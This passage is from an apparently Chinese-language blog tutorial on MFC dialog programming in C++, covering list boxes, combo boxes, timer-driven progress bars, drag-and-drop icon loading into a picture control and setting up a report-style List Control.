class=""><p>先绘制这样的界面，然后就是往里面addsttring，最后根据选中的返回结果这样。</p><blockquote><p>别忘了给listbox添加变量</p></blockquote><p>双击test按钮</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnBnClickedBtnTest</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">CString strText;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( m_conmpany.<span class="built_in">GetSelCount</span>() == <span class="number">0</span> )&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;没有选中任何公司&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="type">int</span> total = m_conmpany.<span class="built_in">GetSelCount</span>();</span><br><span class="line"><span class="type">int</span>* index = <span class="keyword">new</span> <span class="type">int</span>[total];</span><br><span class="line">strText += _T(<span class="string">&quot;您选中了&quot;</span>);</span><br><span class="line">TCHAR buf[<span class="number">32</span>] = _T(<span class="string">&quot;&quot;</span>);</span><br><span class="line">_itow_s(total, buf, <span class="number">32</span>, <span class="number">10</span>);</span><br><span class="line">strText += buf;</span><br><span class="line">strText += _T(<span class="string">&quot;个公司\n&quot;</span>);</span><br><span class="line">m_conmpany.<span class="built_in">GetSelItems</span>(total, index);</span><br><span class="line"></span><br><span class="line">CString strTmp;</span><br><span class="line"><span class="keyword">for</span>( <span class="type">int</span> i = <span class="number">0</span>; i &lt; total; i++ )&#123;</span><br><span class="line">m_conmpany.<span class="built_in">GetText</span>(index[i], strTmp);</span><br><span class="line">strText += strTmp + _T(<span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">delete</span>[] index;</span><br><span class="line"><span class="built_in">MessageBox</span>(strText);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>m_conmpany</code>为我们给listbox这个控件设置的变量。<br>首要判断就是是否选中，选中之后在循环接收。</p><p>别忘了在<code>oninitdialog</code>里面初始化一下这个listbox。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CMFCButtonDlg::OnInitDialog</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CDialogEx::<span class="built_in">OnInitDialog</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动</span></span><br><span class="line"><span class="comment">//  执行此操作</span></span><br><span class="line"><span class="built_in">SetIcon</span>(m_hIcon, TRUE);<span class="comment">// 设置大图标</span></span><br><span class="line"><span class="built_in">SetIcon</span>(m_hIcon, FALSE);<span class="comment">// 设置小图标</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加额外的初始化代码</span></span><br><span class="line">m_conmpany.<span class="built_in">AddString</span>(_T(<span class="string">&quot;山东蓝翔&quot;</span>));</span><br><span class="line">m_conmpany.<span class="built_in">AddString</span>(_T(<span class="string">&quot;深圳电子厂&quot;</span>));</span><br><span class="line">m_conmpany.<span class="built_in">AddString</span>(_T(<span class="string">&quot;义乌商超&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;  <span class="comment">// 除非将焦点设置到控件，否则返回 TRUE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/081.png" class=""><p>效果也不难，就是一些常规操作。</p><hr><h3 id="Combox"><a href="#Combox" class="headerlink" title="Combox"></a>Combox</h3><img src="/2022/07/25/mfc01/083.png" class=""><img src="/2022/07/25/mfc01/084.png" class=""><p>拖出两个控件<br>数据在</p><img src="/2022/07/25/mfc01/085.png" class=""><p>依旧是用分号阻隔。</p><img src="/2022/07/25/mfc01/086.png" class=""><p>样式有三个，除了这个simple特殊一点，因为他不会显示箭头，你选中之后可以通过方向键控制。<br>或者它的神奇之处。。</p><img src="/2022/07/25/mfc01/087.png" class=""><p>你可以在dialog里从下面拉大这个combox，这样他在run的时候就能把在长度之内的列显示出来，虽然有点二。</p><p>当然这种测试都是取出值来玩玩</p><img src="/2022/07/25/mfc01/088.png" class=""><p>左边样式为simple，添加变量<br>右边样式为下拉列表，添加变量<br>然后拖一个按钮，测试用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnBnClickedBtnDroplist</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="type">int</span> cur = m_simple.<span class="built_in">GetCurSel</span>();</span><br><span class="line"><span class="keyword">if</span>( cur == <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):当前没有选中任何列\n&quot;</span>, __FILE__, __LINE__);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):当前选中了第%d列\n&quot;</span>, __FILE__, __LINE__, cur);</span><br><span class="line">CString tmp;</span><br><span class="line"></span><br><span class="line">m_simple.<span class="built_in">GetLBText</span>(cur, tmp);</span><br><span class="line"><span class="built_in">MessageBox</span>(tmp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也比较简单</p><img src="/2022/07/25/mfc01/089.png" class=""><p>我们选中哪个就messagebox弹出哪个，并且TRACE在日志打印，注意列之类的遵循从0开始计数。</p><p>那么还有一个下拉列表，直接套前面那个combox也无伤大雅</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnBnClickedBtnDroplist</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="type">int</span> cur = m_simple.<span class="built_in">GetCurSel</span>();</span><br><span class="line"><span class="keyword">if</span>( cur == <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):当前没有选中任何列\n&quot;</span>, __FILE__, __LINE__);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):当前选中了第%d列\n&quot;</span>, __FILE__, __LINE__, cur);</span><br><span class="line">CString tmp;</span><br><span class="line"></span><br><span class="line">m_simple.<span class="built_in">GetLBText</span>(cur, tmp);</span><br><span class="line"><span class="built_in">MessageBox</span>(tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cur = m_droplist.<span class="built_in">GetCurSel</span>();</span><br><span class="line"><span class="keyword">if</span>( cur == <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):当前没有选中任何列\n&quot;</span>, __FILE__, __LINE__);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):当前选中了第%d列\n&quot;</span>, __FILE__, __LINE__, cur);</span><br><span class="line">CString tmp;</span><br><span class="line"></span><br><span class="line">m_droplist.<span class="built_in">GetLBText</span>(cur, tmp);</span><br><span class="line"><span class="built_in">MessageBox</span>(tmp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/090.png" class=""><p>能看到日志打印的时候，因为m_simple没有选中过，所以会打印未选中任何列，但是后者m_droplist有选中，就有回执信息。</p><blockquote><p>能get的东西挺多的，用到了翻翻文档就行</p></blockquote><hr><h3 id="Progress"><a href="#Progress" class="headerlink" title="Progress"></a>Progress</h3><p>Progress：进度条<br>一般是要配合定时器去用会好点。</p><img src="/2022/07/25/mfc01/091.png" class=""><p>当然这玩意在dialog界面看着有点效果，但实际你自己没写，他就是空的。</p><p>初始化：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CMFCButtonDlg::OnInitDialog</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CDialogEx::<span class="built_in">OnInitDialog</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动</span></span><br><span class="line"><span class="comment">//  执行此操作</span></span><br><span class="line"><span class="built_in">SetIcon</span>(m_hIcon, TRUE);<span class="comment">// 设置大图标</span></span><br><span class="line"><span class="built_in">SetIcon</span>(m_hIcon, FALSE);<span class="comment">// 设置小图标</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加额外的初始化代码</span></span><br><span class="line">m_conmpany.<span class="built_in">AddString</span>(_T(<span class="string">&quot;山东蓝翔&quot;</span>));</span><br><span class="line">m_conmpany.<span class="built_in">AddString</span>(_T(<span class="string">&quot;深圳电子厂&quot;</span>));</span><br><span class="line">m_conmpany.<span class="built_in">AddString</span>(_T(<span class="string">&quot;义乌商超&quot;</span>));</span><br><span class="line"></span><br><span class="line">m_progress.<span class="built_in">SetRange</span>(<span class="number">0</span>, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;  <span class="comment">// 除非将焦点设置到控件，否则返回 TRUE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然有的时候虽然范围可能是整数，但是步长不一样。</p><p>给他加个按钮控制增长。<br><strong>注意改成竖状的时候需要修改进度条外观属性的垂直设置为True</strong></p><p>然后双击按钮</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnBnClickedBtnPrg</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="type">int</span> pos = m_progress.<span class="built_in">GetPos</span>();</span><br><span class="line">m_progress.<span class="built_in">SetPos</span>(pos + <span class="number">100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取初始的时候，然后每次增加100，反正上限1000，10次就到顶了</p><img src="/2022/07/25/mfc01/092.png" class=""><img src="/2022/07/25/mfc01/093.png" class=""><p>当然实际用途不会蠢蠢的给用户去点击，肯定是要与计时器绑定。<br>选中对话框找到消息里面的Timer</p><img src="/2022/07/25/mfc01/094.png" class=""><p>在头文件中应该预设一个进度值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//进度</span></span><br><span class="line"><span class="type">int</span> m_progress_pos;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CMFCButtonDlg::OnInitDialog</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CDialogEx::<span class="built_in">OnInitDialog</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动</span></span><br><span class="line"><span class="comment">//  执行此操作</span></span><br><span class="line"><span class="built_in">SetIcon</span>(m_hIcon, TRUE);<span class="comment">// 设置大图标</span></span><br><span class="line"><span class="built_in">SetIcon</span>(m_hIcon, FALSE);<span class="comment">// 设置小图标</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加额外的初始化代码</span></span><br><span class="line">m_conmpany.<span class="built_in">AddString</span>(_T(<span class="string">&quot;山东蓝翔&quot;</span>));</span><br><span class="line">m_conmpany.<span class="built_in">AddString</span>(_T(<span class="string">&quot;深圳电子厂&quot;</span>));</span><br><span class="line">m_conmpany.<span class="built_in">AddString</span>(_T(<span class="string">&quot;义乌商超&quot;</span>));</span><br><span class="line"></span><br><span class="line">m_progress.<span class="built_in">SetRange</span>(<span class="number">0</span>, <span class="number">1000</span>);</span><br><span class="line">m_progress_pos = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定时器尽量不要低于30ms，不同机子有少许差别，源自mfc的精度不足导致定时器缺陷</span></span><br><span class="line"><span class="built_in">SetTimer</span>(<span class="number">99</span>, <span class="number">500</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">SetTimer</span>(<span class="number">10</span>, <span class="number">100</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;  <span class="comment">// 除非将焦点设置到控件，否则返回 TRUE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化设置定时器的时候要注意，因为mfc分层，不同机子处理速度不同，所以定时器精度不要设置太小，以免出现误差。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnTimer</span><span class="params">(UINT_PTR nIDEvent)</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( nIDEvent == <span class="number">99</span> )&#123;</span><br><span class="line">m_progress.<span class="built_in">SetPos</span>(m_progress_pos);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>( nIDEvent == <span class="number">10</span> )&#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):%s %d\n&quot;</span>, __FILE__, __LINE__, __FUNCTION__, <span class="built_in">GetTickCount</span>());</span><br><span class="line"><span class="keyword">if</span>( count &gt; <span class="number">5</span> ) <span class="built_in">KillTimer</span>(<span class="number">10</span>);</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CDialogEx::<span class="built_in">OnTimer</span>(nIDEvent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/095.png" class=""><p>当我们的间隔设置在5，他的误差还在10左右，拉高之后</p><img src="/2022/07/25/mfc01/096.png" class=""><p><strong>反正就是突出mfc对于定时精度处理不足的问题</strong></p><p>那么接下来让他自己动~</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnTimer</span><span class="params">(UINT_PTR nIDEvent)</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( nIDEvent == <span class="number">99</span> )&#123;</span><br><span class="line">m_progress.<span class="built_in">SetPos</span>(m_progress_pos);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>( nIDEvent == <span class="number">10</span> )&#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):%s %d\n&quot;</span>, __FILE__, __LINE__, __FUNCTION__, <span class="built_in">GetTickCount</span>());</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> low, upper;</span><br><span class="line">m_progress.<span class="built_in">GetRange</span>(low, upper);</span><br><span class="line"><span class="keyword">if</span>( m_progress_pos &gt;= upper )&#123;</span><br><span class="line"><span class="built_in">KillTimer</span>(<span class="number">10</span>);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">m_progress_pos += <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CDialogEx::<span class="built_in">OnTimer</span>(nIDEvent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要也就是获取这个进度的范围，没到头就慢慢网上递增，像复制文件的话，还得在里面计算文件复制到哪了，然后按比例递增效果更明显。</p><img src="/2022/07/25/mfc01/097.png" class=""><p>静态的图片看不出效果。</p><blockquote><p>这是演示从空到满的情况，相反的，进度的初始值要改成上限，然后这里改成-&#x3D;10<br>理论就是如此，实现另说</p></blockquote><p><strong>哈哈，关于这个进度条，千万不要用多个线程去玩。。不然效果很出奇玩自己了属于是</strong></p><hr><h3 id="图片资源"><a href="#图片资源" class="headerlink" title="图片资源"></a>图片资源</h3><p>也是拖出一个picture control。</p><img src="/2022/07/25/mfc01/098.png" class=""><p>有意思的是命名直接是static，和之前的静态文本框有点相似</p><img src="/2022/07/25/mfc01/099.png" class=""><p>拖个静态文本框可以看到有点相同</p><img src="/2022/07/25/mfc01/100.png" class=""><p>反正父类总有一个是一样的。</p><p>控制这些玩意就老样子添加变量&#x2F;控件，添加完之后自然没啥效果。。都没把图片塞进去</p><p>点击dialog，从消息里面找到</p><img src="/2022/07/25/mfc01/101.png" class=""><p>file就是跟文件相关的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnDropFiles</span><span class="params">(HDROP hDropInfo)</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line"><span class="type">int</span> count = <span class="built_in">DragQueryFile</span>(hDropInfo, <span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//count &gt; 1 Msg..</span></span><br><span class="line">TCHAR sPath[MAX_PATH];</span><br><span class="line"><span class="type">char</span> mbsPath[MAX_PATH * <span class="number">2</span>];</span><br><span class="line"><span class="keyword">for</span>( <span class="type">int</span> i = <span class="number">0</span>; i &lt; count; i++ )&#123;</span><br><span class="line"><span class="built_in">memset</span>(sPath, <span class="number">0</span>, <span class="built_in">sizeof</span>(sPath));</span><br><span class="line"><span class="built_in">memset</span>(mbsPath, <span class="number">0</span>, <span class="built_in">sizeof</span>(mbsPath));</span><br><span class="line"><span class="built_in">DragQueryFile</span>(hDropInfo, i, sPath, MAX_PATH);</span><br><span class="line"><span class="type">size_t</span> total = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">wcstombs_s</span>(&amp;total, mbsPath, <span class="built_in">sizeof</span>(mbsPath), sPath, MAX_PATH);</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):%s %s\n&quot;</span>, __FILE__, __LINE__, __FUNCTION__, mbsPath);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">CString</span>(sPath).<span class="built_in">Find</span>(_T(<span class="string">&quot;.ico&quot;</span>)) )&#123;</span><br><span class="line">HICON hicon = (HICON)<span class="built_in">LoadImage</span>(<span class="built_in">AfxGetInstanceHandle</span>(), sPath, IMAGE_ICON, <span class="number">0</span>, <span class="number">0</span>, LR_LOADFROMFILE | LR_DEFAULTSIZE);</span><br><span class="line">m_pictrue.<span class="built_in">SetIcon</span>(hicon);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">InvalidateRect</span>(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">CDialogEx::<span class="built_in">OnDropFiles</span>(hDropInfo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写完之后有一个地方需要注意，因为这个用的图片类型是<code>.ico</code>想直接用mfc那个图片了，所以要修改图片框的类型</p><img src="/2022/07/25/mfc01/102.png" class=""><p>将其修改完之后</p><img src="/2022/07/25/mfc01/103.png" class=""><p>看到样式发生了变化，有点小</p><p>右击打开项目的路径，找到res文件夹，里面就有个mfc的ico</p><img src="/2022/07/25/mfc01/104.png" class=""><p>刚开始运行的时候，是看不到图片框的</p><img src="/2022/07/25/mfc01/105.png" class=""><p>这里忘了一个事，就是设置对话框可接受文件</p><img src="/2022/07/25/mfc01/107.png" class=""><p>不设置为true的话，图片拖动是禁止的。</p><p>设置true之后拖动图片到对话框上，发现的确显示了。</p><img src="/2022/07/25/mfc01/106.png" class=""><p>并且，日志也输出了这个图片的路径</p><img src="/2022/07/25/mfc01/108.png" class=""><hr><h3 id="List-Control"><a href="#List-Control" class="headerlink" title="List Control"></a>List Control</h3><img src="/2022/07/25/mfc01/109.png" class=""><p>长的吧跟列表又有点相似。倒是多了图标</p><img src="/2022/07/25/mfc01/110.png" class=""><p>其中有几种可选，默认为icon样式</p><p>在list视图下就真的跟列表一样了。</p><img src="/2022/07/25/mfc01/111.png" class=""><p>report视图感觉会用的多一点</p><img src="/2022/07/25/mfc01/112.png" class=""><p>这里先用report，为这个控件添加变量，然后初始化一下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CMFCButtonDlg::OnInitDialog</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CDialogEx::<span class="built_in">OnInitDialog</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动</span></span><br><span class="line"><span class="comment">//  执行此操作</span></span><br><span class="line"><span class="built_in">SetIcon</span>(m_hIcon, TRUE);<span class="comment">// 设置大图标</span></span><br><span class="line"><span class="built_in">SetIcon</span>(m_hIcon, FALSE);<span class="comment">// 设置小图标</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加额外的初始化代码</span></span><br><span class="line">m_conmpany.<span class="built_in">AddString</span>(_T(<span class="string">&quot;山东蓝翔&quot;</span>));</span><br><span class="line">m_conmpany.<span class="built_in">AddString</span>(_T(<span class="string">&quot;深圳电子厂&quot;</span>));</span><br><span class="line">m_conmpany.<span class="built_in">AddString</span>(_T(<span class="string">&quot;义乌商超&quot;</span>));</span><br><span class="line"></span><br><span class="line">m_progress.<span class="built_in">SetRange</span>(<span class="number">0</span>, <span class="number">1000</span>);</span><br><span class="line">m_progress_pos = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定时器尽量不要低于30ms，不同机子有少许差别，源自mfc的精度不足导致定时器缺陷</span></span><br><span class="line"><span class="built_in">SetTimer</span>(<span class="number">99</span>, <span class="number">500</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">SetTimer</span>(<span class="number">10</span>, <span class="number">100</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化列</span></span><br><span class="line">m_list.<span class="built_in">InsertColumn</span>(<span class="number">0</span>, _T(<span class="string">&quot;序号&quot;</span>));</span><br><span class="line">m_list.<span class="built_in">InsertColumn</span>(<span class="number">1</span>, _T(<span class="string">&quot;IP&quot;</span>));</span><br><span class="line">m_list.<span class="built_in">InsertColumn</span>(<span class="number">2</span>, _T(<span class="string">&quot;ID&quot;</span>));</span><br><span class="line">m_list.<span class="built_in">InsertColumn</span>(<span class="number">3</span>, _T(<span class="string">&quot;CHECK&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;  <span class="comment">// 除非将焦点设置到控件，否则返回 TRUE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/113.png" class=""><p>设置文字是没啥问题了，但是一开始他都是缩在一团还要拉开太麻烦了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">m_list.<span class="built_in">InsertColumn</span>(<span class="number">0</span>, _T(<span class="string">&quot;序号&quot;</span>), LVCFMT_LEFT, <span class="number">50</span>);</span><br><span class="line">m_list.<span class="built_in">InsertColumn</span>(<span class="number">1</span>, _T(<span class="string">&quot;IP&quot;</span>), LVCFMT_LEFT, <span class="number">200</span>);</span><br><span class="line">m_list.<span class="built_in">InsertColumn</span>(<span class="number">2</span>, _T(<span class="string">&quot;ID&quot;</span>), LVCFMT_LEFT, <span class="number">180</span>);</span><br><span class="line">m_list.<span class="built_in">InsertColumn</span>(<span class="number">3</span>, _T(<span class="string">&quot;CHECK&quot;</span>), LVCFMT_LEFT, <span class="number">200</span>);</span><br></pre></td></tr></table></figure><p>修改完之后，其实还要调整一下list control在对话框里面的大小</p><img src="/2022/07/25/mfc01/114.png" class=""><p>目前来说调整成这样差不多。再不济，空间有限的情况下，给他上滚动条</p><p>除此之外也可以用代码实现改变style，同样在初始化的地方</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td 